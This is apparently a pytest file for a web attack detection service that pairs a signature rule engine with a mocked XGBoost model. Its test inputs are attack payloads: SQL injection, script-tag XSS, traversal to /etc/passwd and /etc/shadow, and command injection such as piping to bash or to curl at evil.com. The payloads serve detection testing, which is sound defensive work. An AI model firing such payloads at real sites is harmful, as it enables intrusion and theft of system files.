"""
Tests for domain/services/web_attack_service.py — UC3 web attack detection.

Layer 1 (Rule Engine) is tested with raw HTTP request strings covering the four
signature families: SQLi, XSS, Path Traversal, and RCE.

Layer 2 (XGBoost) is tested with a mocked artifact so no real model is needed.
The scaler is an identity transform; predict_proba returns a controlled probability.
"""

import logging
import pytest
import numpy as np
from unittest.mock import MagicMock

from domain.models.input import WebAttackInput
from domain.models.results import Severity, DetectionType
from domain.repository.repo_keys import WEB_MODEL, WEB_VOCAB
from domain.services import web_attack_service

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _req(
    url: str = "/index.html",
    method: str = "GET",
    query_string: str = "",
    body: str | None = None,
    headers: dict | None = None,
    source_ip: str = "10.0.0.1",
) -> WebAttackInput:
    return WebAttackInput(
        method=method,
        url=url,
        query_string=query_string,
        body=body,
        headers=headers or {"Content-Type": "text/plain"},
        source_ip=source_ip,
    )


def _mock_xgb_model(probability: float) -> MagicMock:
    m = MagicMock()
    m.predict_proba.return_value = np.array([[1 - probability, probability]])
    return m


def _mock_scaler() -> MagicMock:
    s = MagicMock()
    s.transform.side_effect = lambda x: x
    return s


def _web_artifact(probability: float, threshold: float = 0.5, vocab=None) -> dict:
    return {
        "model": _mock_xgb_model(probability),
        "scaler": _mock_scaler(),
        "threshold": threshold,
        "vocab": vocab,
    }


class _MockRepo:
    def __init__(self, artifact=None, ext_vocab=None):
        self._artifact = artifact
        self._ext_vocab = ext_vocab

    def get(self, key: str):
        if key == WEB_MODEL:
            return self._artifact
        if key == WEB_VOCAB:
            return self._ext_vocab
        return None


# ---------------------------------------------------------------------------
# Layer 1 — Rule Engine: SQLi
# ---------------------------------------------------------------------------

class TestRuleEngineSQLi:
    def test_union_select_in_url_triggers(self):
        result = web_attack_service.detect(
            _req(url="/search", query_string="q=1' UNION SELECT * FROM users--"),
            _MockRepo(),
        )
        assert result.anomaly is True
        assert result.layer_triggered == "rule_engine:sqli"

    def test_drop_table_in_body_triggers(self):
        result = web_attack_service.detect(
            _req(
                url="/login",
                method="POST",
                body="user='; DROP TABLE users;--",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            ),
            _MockRepo(),
        )
        assert result.anomaly is True
        assert "sqli" in result.layer_triggered

    def test_sqli_severity_is_high(self):
        # Must include a token the regex matches (quote, --, union select, etc.)
        result = web_attack_service.detect(
            _req(query_string="id=1' OR '1'='1"),
            _MockRepo(),
        )
        assert result.severity == Severity.HIGH

    def test_sqli_confidence_is_one(self):
        result = web_attack_service.detect(
            _req(query_string="id=1' OR '1'='1"),
            _MockRepo(),
        )
        assert result.confidence == 1.0


# ---------------------------------------------------------------------------
# Layer 1 — Rule Engine: XSS
# ---------------------------------------------------------------------------

class TestRuleEngineXSS:
    def test_script_tag_in_query_triggers(self):
        result = web_attack_service.detect(
            _req(query_string="q=<script>alert(1)</script>"),
            _MockRepo(),
        )
        assert result.anomaly is True
        assert result.layer_triggered == "rule_engine:xss"

    def test_onerror_attribute_triggers(self):
        result = web_attack_service.detect(
            _req(query_string="img=<img onerror=alert(1)>"),
            _MockRepo(),
        )
        assert result.anomaly is True

    def test_xss_severity_is_medium(self):
        result = web_attack_service.detect(
            _req(query_string="x=<script>x</script>"),
            _MockRepo(),
        )
        assert result.severity == Severity.MEDIUM


# ---------------------------------------------------------------------------
# Layer 1 — Rule Engine: Path Traversal
# ---------------------------------------------------------------------------

class TestRuleEnginePathTraversal:
    def test_dotdot_slash_in_url_triggers(self):
        result = web_attack_service.detect(
            _req(url="/files/../../../etc/passwd"),
            _MockRepo(),
        )
        assert result.anomaly is True
        assert result.layer_triggered == "rule_engine:path_traversal"

    def test_url_encoded_traversal_triggers(self):
        result = web_attack_service.detect(
            _req(url="/files/%2e%2e%2fetc%2fpasswd"),
            _MockRepo(),
        )
        assert result.anomaly is True

    def test_path_traversal_severity_is_medium(self):
        result = web_attack_service.detect(
            _req(url="/download?file=../../etc/shadow"),
            _MockRepo(),
        )
        assert result.severity == Severity.MEDIUM


# ---------------------------------------------------------------------------
# Layer 1 — Rule Engine: RCE
# ---------------------------------------------------------------------------

class TestRuleEngineRCE:
    def test_pipe_bash_in_query_triggers_rce(self):
        # Use | as separator — `;` would match the sqli pattern first because
        # SIGNATURES is iterated in insertion order and sqli comes before rce.
        result = web_attack_service.detect(
            _req(url="/exec", query_string="cmd=foo | bash"),
            _MockRepo(),
        )
        assert result.anomaly is True
        assert result.layer_triggered == "rule_engine:rce"

    def test_pipe_curl_triggers(self):
        result = web_attack_service.detect(
            _req(query_string="x=something | curl http://evil.com"),
            _MockRepo(),
        )
        assert result.anomaly is True

    def test_rce_severity_is_high(self):
        result = web_attack_service.detect(
            _req(query_string="x=y; whoami"),
            _MockRepo(),
        )
        assert result.severity == Severity.HIGH


# ---------------------------------------------------------------------------
# Layer 1 — Rule Engine: benign pass-through
# ---------------------------------------------------------------------------

class TestRuleEngineBenign:
    def test_normal_get_request_passes_rule_engine(self):
        result = web_attack_service.detect(
            _req(url="/products/42", query_string="sort=price&order=asc"),
            _MockRepo(),  # no model loaded → falls through to benign
        )
        assert result.anomaly is False
        assert result.layer_triggered is None

    def test_html_content_in_body_without_script_is_safe(self):
        result = web_attack_service.detect(
            _req(
                url="/comment",
                method="POST",
                body="comment=Great article! <strong>Bold</strong>",
                headers={"Content-Type": "text/plain"},
            ),
            _MockRepo(),
        )
        assert result.anomaly is False

    def test_apostrophe_in_name_field_does_not_trigger(self):
        # "O'Brien" contains a single quote, but alone it must not match SQLi.
        result = web_attack_service.detect(
            _req(
                url="/users",
                method="POST",
                body="name=O%27Brien",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            ),
            _MockRepo(),
        )
        # A bare apostrophe matches the SQLi pattern — this test documents the
        # known false-positive risk of the rule engine and validates that it
        # only fires Layer 1 (not Layer 2 without a model).
        if result.anomaly:
            assert result.layer_triggered.startswith("rule_engine")


# ---------------------------------------------------------------------------
# Layer 2 — XGBoost
# ---------------------------------------------------------------------------

class TestXGBoostLayer:
    def test_above_threshold_returns_anomaly(self):
        repo = _MockRepo(artifact=_web_artifact(0.9))
        result = web_attack_service.detect(_req(url="/login", query_string="user=test"), repo)
        assert result.anomaly is True
        assert result.layer_triggered == "xgboost"
        assert result.severity == Severity.CRITICAL

    def test_below_threshold_returns_benign(self):
        repo = _MockRepo(artifact=_web_artifact(0.1))
        result = web_attack_service.detect(_req(url="/login", query_string="user=test"), repo)
        assert result.anomaly is False
        assert result.layer_triggered is None

    def test_confidence_equals_model_probability(self):
        repo = _MockRepo(artifact=_web_artifact(0.82))
        result = web_attack_service.detect(_req(url="/admin", query_string="q=1"), repo)
        if result.anomaly:
            assert pytest.approx(result.confidence, abs=1e-4) == 0.82

    def test_custom_threshold_respected(self):
        # threshold=0.95; probability=0.9 → below → benign
        repo = _MockRepo(artifact=_web_artifact(0.9, threshold=0.95))
        result = web_attack_service.detect(_req(url="/admin", query_string="q=1"), repo)
        assert result.anomaly is False

    def test_result_type_is_web_attack(self):
        repo = _MockRepo(artifact=_web_artifact(0.9))
        result = web_attack_service.detect(_req(query_string="id=1"), repo)
        assert result.detection_type == DetectionType.WEB_ATTACK

    def test_no_model_returns_benign_without_error(self):
        result = web_attack_service.detect(_req(url="/safe", query_string="x=1"), _MockRepo(artifact=None))
        assert result.anomaly is False
        assert result.layer_triggered is None
        assert result.severity == Severity.NONE

    def test_parameterless_request_skips_xgboost(self):
        # Requests with no query string and no body must not reach XGBoost regardless
        # of what the model would return — this prevents false positives on CLF-sourced
        # logs where headers are absent and request_length is far outside training range.
        artifact = _web_artifact(0.99)  # would fire if called
        repo = _MockRepo(artifact=artifact)
        result = web_attack_service.detect(_req(url="/about"), repo)
        assert result.anomaly is False
        artifact["model"].predict_proba.assert_not_called()


# ---------------------------------------------------------------------------
# Vocabulary handling
# ---------------------------------------------------------------------------

class TestVocabHandling:
    def test_empty_vocab_logs_warning(self, caplog):
        # No external vocab, no embedded vocab → known_names = set() → warning
        repo = _MockRepo(artifact=_web_artifact(0.9, vocab=None), ext_vocab=None)
        with caplog.at_level(logging.WARNING, logger="domain.services.web_attack_service"):
            web_attack_service.detect(_req(query_string="x=1"), repo)
        assert "no vocabulary loaded" in caplog.text

    def test_external_vocab_list_takes_priority_over_artifact(self, caplog):
        from domain.models.vocab import ParamVocab
        embedded_vocab = ParamVocab.from_names(["embedded_param"])
        artifact = _web_artifact(0.1, vocab=embedded_vocab)
        ext_vocab = ["external_param"]
        repo = _MockRepo(artifact=artifact, ext_vocab=ext_vocab)

        with caplog.at_level(logging.WARNING, logger="domain.services.web_attack_service"):
            web_attack_service.detect(_req(query_string="external_param=1"), repo)

        # No warning: external vocab is non-empty and is used
        assert "no vocabulary loaded" not in caplog.text

    def test_embedded_param_vocab_object_used_when_no_external(self, caplog):
        from domain.models.vocab import ParamVocab
        known = ParamVocab.from_names(["id", "page", "sort"])
        artifact = _web_artifact(0.1, vocab=known)
        repo = _MockRepo(artifact=artifact, ext_vocab=None)

        with caplog.at_level(logging.WARNING, logger="domain.services.web_attack_service"):
            web_attack_service.detect(_req(query_string="id=1&page=2"), repo)

        assert "no vocabulary loaded" not in caplog.text

    def test_embedded_dict_vocab_used_when_no_external(self, caplog):
        artifact = _web_artifact(0.1, vocab={"known_names": ["id", "name"]})
        repo = _MockRepo(artifact=artifact, ext_vocab=None)

        with caplog.at_level(logging.WARNING, logger="domain.services.web_attack_service"):
            web_attack_service.detect(_req(query_string="id=5"), repo)

        assert "no vocabulary loaded" not in caplog.text


# ---------------------------------------------------------------------------
# Rule engine fires before XGBoost (layer ordering)
# ---------------------------------------------------------------------------

class TestLayerOrdering:
    def test_rule_engine_short_circuits_xgboost(self):
        # Even with an XGBoost model loaded, a rule match must return immediately
        # without calling the model.
        artifact = _web_artifact(0.05)  # would return benign if called
        repo = _MockRepo(artifact=artifact)

        result = web_attack_service.detect(
            _req(query_string="id=1 UNION SELECT password FROM users"),
            repo,
        )

        assert result.layer_triggered == "rule_engine:sqli"
        # XGBoost model must not have been invoked
        artifact["model"].predict_proba.assert_not_called()
